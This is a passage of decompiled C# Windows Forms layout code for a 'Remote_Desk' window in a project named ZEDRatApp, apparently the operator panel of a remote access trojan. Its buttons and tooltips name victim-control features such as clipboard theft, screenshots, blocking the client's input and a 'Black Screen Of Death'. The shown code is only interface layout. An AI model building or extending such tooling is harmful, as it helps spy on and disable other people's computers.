			this.blankScreenToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.blankScreenToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("blankScreenToolStripMenuItem.Image");
			this.blankScreenToolStripMenuItem.Name = "blankScreenToolStripMenuItem";
			this.blankScreenToolStripMenuItem.Size = new System.Drawing.Size(160, 22);
			this.blankScreenToolStripMenuItem.Text = "BlankScreen";
			this.blankScreenToolStripMenuItem.Click += new System.EventHandler(blankScreenToolStripMenuItem_Click);
			this.saveDIBToolStripMenuItem.CheckOnClick = true;
			this.saveDIBToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.saveDIBToolStripMenuItem.Image = ZEDRatApp.Properties.Resources.unsplash_50px;
			this.saveDIBToolStripMenuItem.Name = "saveDIBToolStripMenuItem";
			this.saveDIBToolStripMenuItem.Size = new System.Drawing.Size(160, 22);
			this.saveDIBToolStripMenuItem.Text = "Save Sceenshots";
			this.saveDIBToolStripMenuItem.Click += new System.EventHandler(saveDIBToolStripMenuItem_Click);
			this.toolStripMenuItem.CheckOnClick = true;
			this.toolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.toolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem.Image");
			this.toolStripMenuItem.Name = "toolStripMenuItem";
			this.toolStripMenuItem.Size = new System.Drawing.Size(160, 22);
			this.toolStripMenuItem.Text = "Set Clipboard";
			this.toolStripMenuItem.Click += new System.EventHandler(toolStripMenuItem_Click);
			this.getClipboardToolStripMenuItem.CheckOnClick = true;
			this.getClipboardToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			this.getClipboardToolStripMenuItem.Image = ZEDRatApp.Properties.Resources.clipboard_50px;
			this.getClipboardToolStripMenuItem.Name = "getClipboardToolStripMenuItem";
			this.getClipboardToolStripMenuItem.Size = new System.Drawing.Size(160, 22);
			this.getClipboardToolStripMenuItem.Text = "Get Clipboard";
			this.getClipboardToolStripMenuItem.Click += new System.EventHandler(getClipboardToolStripMenuItem_Click);
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel2).Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel2).BackColor = System.Drawing.Color.Transparent;
			this.SiticoneHtmlLabel2.Font = new System.Drawing.Font("Century Gothic", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.SiticoneHtmlLabel2.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel2).Location = new System.Drawing.Point(570, 736);
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel2).Margin = new System.Windows.Forms.Padding(4);
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel2).Name = "SiticoneHtmlLabel2";
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel2).Size = new System.Drawing.Size(52, 19);
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel2).TabIndex = 121;
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel2).Text = "Quality:";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel2, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel2, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel2, "");
			((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel2).Visible = false;
			((System.Windows.Forms.Control)(object)this.lblQualityShow).Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.lblQualityShow).BackColor = System.Drawing.Color.Transparent;
			this.lblQualityShow.Font = new System.Drawing.Font("Century Gothic", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.lblQualityShow.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.lblQualityShow).Location = new System.Drawing.Point(1062, 736);
			((System.Windows.Forms.Control)(object)this.lblQualityShow).Margin = new System.Windows.Forms.Padding(4);
			((System.Windows.Forms.Control)(object)this.lblQualityShow).Name = "lblQualityShow";
			((System.Windows.Forms.Control)(object)this.lblQualityShow).Size = new System.Drawing.Size(24, 19);
			((System.Windows.Forms.Control)(object)this.lblQualityShow).TabIndex = 122;
			((System.Windows.Forms.Control)(object)this.lblQualityShow).Text = "100";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.lblQualityShow, "");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.lblQualityShow, null);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.lblQualityShow, "");
			((System.Windows.Forms.Control)(object)this.lblQualityShow).Visible = false;
			this.barQuality.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.barQuality.FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			this.barQuality.HoverState.Parent = this.barQuality;
			this.barQuality.Location = new System.Drawing.Point(642, 733);
			this.barQuality.Margin = new System.Windows.Forms.Padding(4);
			this.barQuality.Name = "barQuality";
			this.barQuality.Size = new System.Drawing.Size(400, 30);
			this.barQuality.TabIndex = 124;
			this.barQuality.ThumbColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuToolTip1.SetToolTip(this.barQuality, "");
			this.bunifuToolTip1.SetToolTipIcon(this.barQuality, null);
			this.bunifuToolTip1.SetToolTipTitle(this.barQuality, "");
			this.barQuality.Value = 100;
			this.barQuality.Visible = false;
			this.barQuality.Scroll += new System.Windows.Forms.ScrollEventHandler(guna2TrackBar1_Scroll);
			((System.Windows.Forms.Control)(object)this.btnStart).Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			(this.btnStart).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnStart).BorderThickness = 1;
			(this.btnStart).CheckedState.Parent = this.btnStart;
			(this.btnStart).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnStart).CustomBorderThickness = new System.Windows.Forms.Padding(1, 0, 0, 0);
			(this.btnStart).CustomImages.Parent = this.btnStart;
			(this.btnStart).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.btnStart).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnStart).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.btnStart).Location = new System.Drawing.Point(16, 729);
			((System.Windows.Forms.Control)(object)this.btnStart).Margin = new System.Windows.Forms.Padding(4);
			((System.Windows.Forms.Control)(object)this.btnStart).Name = "btnStart";
			(this.btnStart).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnStart;
			((System.Windows.Forms.Control)(object)this.btnStart).Size = new System.Drawing.Size(130, 36);
			((System.Windows.Forms.Control)(object)this.btnStart).TabIndex = 125;
			((System.Windows.Forms.Control)(object)this.btnStart).Text = "Control ON";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.btnStart, "Enable Controls");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.btnStart, ZEDRatApp.Properties.Resources.SystemInfo);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.btnStart, "Hydra");
			((System.Windows.Forms.Control)(object)this.btnStart).Click += new System.EventHandler(btnStart_Click);
			((System.Windows.Forms.Control)(object)this.btnStop).Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			(this.btnStop).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnStop).BorderThickness = 1;
			(this.btnStop).CheckedState.Parent = this.btnStop;
			(this.btnStop).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnStop).CustomBorderThickness = new System.Windows.Forms.Padding(1, 0, 0, 0);
			(this.btnStop).CustomImages.Parent = this.btnStop;
			(this.btnStop).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.btnStop).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnStop).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.btnStop).Location = new System.Drawing.Point(154, 729);
			((System.Windows.Forms.Control)(object)this.btnStop).Margin = new System.Windows.Forms.Padding(4);
			((System.Windows.Forms.Control)(object)this.btnStop).Name = "btnStop";
			(this.btnStop).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnStop;
			((System.Windows.Forms.Control)(object)this.btnStop).Size = new System.Drawing.Size(130, 36);
			((System.Windows.Forms.Control)(object)this.btnStop).TabIndex = 126;
			((System.Windows.Forms.Control)(object)this.btnStop).Text = "Control Off";
			this.bunifuToolTip1.SetToolTip((System.Windows.Forms.Control)(object)this.btnStop, "Disable Controls");
			this.bunifuToolTip1.SetToolTipIcon((System.Windows.Forms.Control)(object)this.btnStop, ZEDRatApp.Properties.Resources.SystemInfo);
			this.bunifuToolTip1.SetToolTipTitle((System.Windows.Forms.Control)(object)this.btnStop, "Hydra");
			((System.Windows.Forms.Control)(object)this.btnStop).Click += new System.EventHandler(btnStop_Click);
			this.bunifuToolTip1.Active = true;
			this.bunifuToolTip1.AlignTextWithTitle = false;
			this.bunifuToolTip1.AllowAutoClose = false;
			this.bunifuToolTip1.AllowFading = true;
			this.bunifuToolTip1.AutoCloseDuration = 5000;
			this.bunifuToolTip1.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.bunifuToolTip1.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuToolTip1.ClickToShowDisplayControl = false;
			this.bunifuToolTip1.ConvertNewlinesToBreakTags = true;
			this.bunifuToolTip1.DisplayControl = null;
			this.bunifuToolTip1.EntryAnimationSpeed = 350;
			this.bunifuToolTip1.ExitAnimationSpeed = 200;
			this.bunifuToolTip1.GenerateAutoCloseDuration = false;
			this.bunifuToolTip1.IconMargin = 6;
			this.bunifuToolTip1.InitialDelay = 0;
			this.bunifuToolTip1.Name = "bunifuToolTip1";
			this.bunifuToolTip1.Opacity = 1.0;
			this.bunifuToolTip1.OverrideToolTipTitles = false;
			this.bunifuToolTip1.Padding = new System.Windows.Forms.Padding(10);
			this.bunifuToolTip1.ReshowDelay = 100;
			this.bunifuToolTip1.ShowAlways = true;
			this.bunifuToolTip1.ShowBorders = false;
			this.bunifuToolTip1.ShowIcons = true;
			this.bunifuToolTip1.ShowShadows = true;
			this.bunifuToolTip1.Tag = null;
			this.bunifuToolTip1.TextFont = new System.Drawing.Font("Century Gothic", 9f);
			this.bunifuToolTip1.TextForeColor = System.Drawing.Color.White;
			this.bunifuToolTip1.TextMargin = 2;
			this.bunifuToolTip1.TitleFont = new System.Drawing.Font("Century Gothic", 9f, System.Drawing.FontStyle.Bold);
			this.bunifuToolTip1.TitleForeColor = System.Drawing.Color.Silver;
			this.bunifuToolTip1.ToolTipPosition = new System.Drawing.Point(0, 0);
			this.bunifuToolTip1.ToolTipTitle = null;
			this.guna2PictureBox5.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.guna2PictureBox5.AutoRoundedCorners = true;
			this.guna2PictureBox5.BackColor = System.Drawing.Color.Transparent;
			this.guna2PictureBox5.BorderRadius = 17;
			this.guna2PictureBox5.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
			this.guna2PictureBox5.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox5.Image");
			this.guna2PictureBox5.ImageRotate = 0f;
			this.guna2PictureBox5.Location = new System.Drawing.Point(295, 729);
			this.guna2PictureBox5.Margin = new System.Windows.Forms.Padding(4);
			this.guna2PictureBox5.Name = "guna2PictureBox5";
			this.guna2PictureBox5.ShadowDecoration.Parent = this.guna2PictureBox5;
			this.guna2PictureBox5.Size = new System.Drawing.Size(36, 36);
			this.guna2PictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.guna2PictureBox5.TabIndex = 130;
			this.guna2PictureBox5.TabStop = false;
			this.bunifuToolTip1.SetToolTip(this.guna2PictureBox5, "Block User Input On Client");
			this.bunifuToolTip1.SetToolTipIcon(this.guna2PictureBox5, ZEDRatApp.Properties.Resources.SystemInfo);
			this.bunifuToolTip1.SetToolTipTitle(this.guna2PictureBox5, "Hydra");
			this.guna2PictureBox5.UseTransparentBackground = true;
			this.guna2PictureBox5.Click += new System.EventHandler(blockInputToolStripMenuItem_Click);
			this.guna2PictureBox6.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.guna2PictureBox6.AutoRoundedCorners = true;
			this.guna2PictureBox6.BackColor = System.Drawing.Color.Transparent;
			this.guna2PictureBox6.BorderRadius = 17;
			this.guna2PictureBox6.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
			this.guna2PictureBox6.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox6.Image");
			this.guna2PictureBox6.ImageRotate = 0f;
			this.guna2PictureBox6.Location = new System.Drawing.Point(339, 729);
			this.guna2PictureBox6.Margin = new System.Windows.Forms.Padding(4);
			this.guna2PictureBox6.Name = "guna2PictureBox6";
			this.guna2PictureBox6.ShadowDecoration.Parent = this.guna2PictureBox6;
			this.guna2PictureBox6.Size = new System.Drawing.Size(36, 36);
			this.guna2PictureBox6.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.guna2PictureBox6.TabIndex = 131;
			this.guna2PictureBox6.TabStop = false;
			this.bunifuToolTip1.SetToolTip(this.guna2PictureBox6, "Capture Screenshots");
			this.bunifuToolTip1.SetToolTipIcon(this.guna2PictureBox6, ZEDRatApp.Properties.Resources.SystemInfo);
			this.bunifuToolTip1.SetToolTipTitle(this.guna2PictureBox6, "Hydra");
			this.guna2PictureBox6.UseTransparentBackground = true;
			this.guna2PictureBox6.Click += new System.EventHandler(saveDIBToolStripMenuItem_Click);
			this.CloseBtn.AllowAnimations = true;
			this.CloseBtn.AllowBorderColorChanges = true;
			this.CloseBtn.AllowMouseEffects = true;
			this.CloseBtn.AnimationSpeed = 200;
			this.CloseBtn.BackColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BackgroundColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.CloseBtn.BorderRadius = 1;
			this.CloseBtn.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.CloseBtn.BorderThickness = 1;
			this.CloseBtn.ColorContrastOnClick = 30;
			this.CloseBtn.ColorContrastOnHover = 30;
			this.CloseBtn.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.CloseBtn.CustomizableEdges = borderEdges;
			this.CloseBtn.DialogResult = System.Windows.Forms.DialogResult.None;
			this.CloseBtn.Image = (System.Drawing.Image)resources.GetObject("CloseBtn.Image");
			this.CloseBtn.ImageMargin = new System.Windows.Forms.Padding(0);
			this.CloseBtn.Location = new System.Drawing.Point(18, 15);
			this.CloseBtn.Margin = new System.Windows.Forms.Padding(4);
			this.CloseBtn.Name = "CloseBtn";
			this.CloseBtn.RoundBorders = false;
			this.CloseBtn.ShowBorders = true;
			this.CloseBtn.Size = new System.Drawing.Size(46, 46);
			this.CloseBtn.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.CloseBtn.TabIndex = 169;
			this.bunifuToolTip1.SetToolTip(this.CloseBtn, "");
			this.bunifuToolTip1.SetToolTipIcon(this.CloseBtn, null);
			this.bunifuToolTip1.SetToolTipTitle(this.CloseBtn, "");
			this.guna2PictureBox4.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.guna2PictureBox4.AutoRoundedCorners = true;
			this.guna2PictureBox4.BackColor = System.Drawing.Color.Transparent;
			this.guna2PictureBox4.BorderRadius = 17;
			this.guna2PictureBox4.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
			this.guna2PictureBox4.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox4.Image");
			this.guna2PictureBox4.ImageRotate = 0f;
			this.guna2PictureBox4.Location = new System.Drawing.Point(475, 729);
			this.guna2PictureBox4.Margin = new System.Windows.Forms.Padding(4);
			this.guna2PictureBox4.Name = "guna2PictureBox4";
			this.guna2PictureBox4.ShadowDecoration.Parent = this.guna2PictureBox4;
			this.guna2PictureBox4.Size = new System.Drawing.Size(36, 36);
			this.guna2PictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.guna2PictureBox4.TabIndex = 129;
			this.guna2PictureBox4.TabStop = false;
			this.bunifuToolTip1.SetToolTip(this.guna2PictureBox4, "Black Screen Of Death");
			this.bunifuToolTip1.SetToolTipIcon(this.guna2PictureBox4, ZEDRatApp.Properties.Resources.SystemInfo);
			this.bunifuToolTip1.SetToolTipTitle(this.guna2PictureBox4, "Hydra");
			this.guna2PictureBox4.UseTransparentBackground = true;
			this.guna2PictureBox4.Visible = false;
			this.guna2PictureBox4.Click += new System.EventHandler(blankScreenToolStripMenuItem_Click);
			this.guna2PictureBox3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.guna2PictureBox3.AutoRoundedCorners = true;
			this.guna2PictureBox3.BackColor = System.Drawing.Color.Transparent;
			this.guna2PictureBox3.BorderRadius = 17;
			this.guna2PictureBox3.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
			this.guna2PictureBox3.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox3.Image");
			this.guna2PictureBox3.ImageRotate = 0f;
			this.guna2PictureBox3.Location = new System.Drawing.Point(429, 729);
			this.guna2PictureBox3.Margin = new System.Windows.Forms.Padding(4);
			this.guna2PictureBox3.Name = "guna2PictureBox3";
			this.guna2PictureBox3.ShadowDecoration.Parent = this.guna2PictureBox3;
			this.guna2PictureBox3.Size = new System.Drawing.Size(36, 36);
			this.guna2PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.guna2PictureBox3.TabIndex = 128;
			this.guna2PictureBox3.TabStop = false;
			this.bunifuToolTip1.SetToolTip(this.guna2PictureBox3, "Get Clipboard");
			this.bunifuToolTip1.SetToolTipIcon(this.guna2PictureBox3, ZEDRatApp.Properties.Resources.SystemInfo);
			this.bunifuToolTip1.SetToolTipTitle(this.guna2PictureBox3, "Hydra");
			this.guna2PictureBox3.UseTransparentBackground = true;
			this.guna2PictureBox3.Visible = false;
			this.guna2PictureBox3.Click += new System.EventHandler(getClipboardToolStripMenuItem_Click);
			this.guna2PictureBox2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.guna2PictureBox2.AutoRoundedCorners = true;
			this.guna2PictureBox2.BackColor = System.Drawing.Color.Transparent;
			this.guna2PictureBox2.BorderRadius = 17;
			this.guna2PictureBox2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
			this.guna2PictureBox2.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox2.Image");
			this.guna2PictureBox2.ImageRotate = 0f;
			this.guna2PictureBox2.Location = new System.Drawing.Point(383, 729);
			this.guna2PictureBox2.Margin = new System.Windows.Forms.Padding(4);
			this.guna2PictureBox2.Name = "guna2PictureBox2";
			this.guna2PictureBox2.ShadowDecoration.Parent = this.guna2PictureBox2;
			this.guna2PictureBox2.Size = new System.Drawing.Size(36, 36);
			this.guna2PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.guna2PictureBox2.TabIndex = 127;
			this.guna2PictureBox2.TabStop = false;
			this.bunifuToolTip1.SetToolTip(this.guna2PictureBox2, "Set ClipBoard");
			this.bunifuToolTip1.SetToolTipIcon(this.guna2PictureBox2, ZEDRatApp.Properties.Resources.SystemInfo);
			this.bunifuToolTip1.SetToolTipTitle(this.guna2PictureBox2, "Hydra");
			this.guna2PictureBox2.UseTransparentBackground = true;
			this.guna2PictureBox2.Visible = false;
			this.guna2PictureBox2.Click += new System.EventHandler(toolStripMenuItem_Click);
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 17f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(1200, 780);
			base.Controls.Add(this.CloseBtn);
			base.Controls.Add(this.guna2PictureBox6);
			base.Controls.Add(this.guna2PictureBox5);
			base.Controls.Add(this.guna2PictureBox4);
			base.Controls.Add(this.guna2PictureBox3);
			base.Controls.Add(this.guna2PictureBox2);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnStop);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnStart);
			base.Controls.Add(this.barQuality);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.lblQualityShow);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.SiticoneHtmlLabel2);
			base.Controls.Add(this.guna2Panel1);
			base.Controls.Add(this.bunifuSeparator1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.label1);
			base.Controls.Add(this.guna2ControlBox1);
			base.Controls.Add(this.bunifuSeparator2);
			this.Font = new System.Drawing.Font("Century Gothic", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.ForeColor = System.Drawing.Color.WhiteSmoke;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(4);
			base.Name = "Remote_Desk";
			this.Text = "Remote_Desk";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(Remote_Desk_FormClosed);
			base.Load += new System.EventHandler(Remote_Desk_Load);
			this.guna2Panel1.ResumeLayout(false);
			((System.ComponentModel.ISupportInitialize)this.picDesktop).EndInit();
			this.guna2ContextMenuStrip1.ResumeLayout(false);
			((System.ComponentModel.ISupportInitialize)this.guna2PictureBox5).EndInit();
			((System.ComponentModel.ISupportInitialize)this.guna2PictureBox6).EndInit();
			((System.ComponentModel.ISupportInitialize)this.guna2PictureBox4).EndInit();
			((System.ComponentModel.ISupportInitialize)this.guna2PictureBox3).EndInit();
			((System.ComponentModel.ISupportInitialize)this.guna2PictureBox2).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
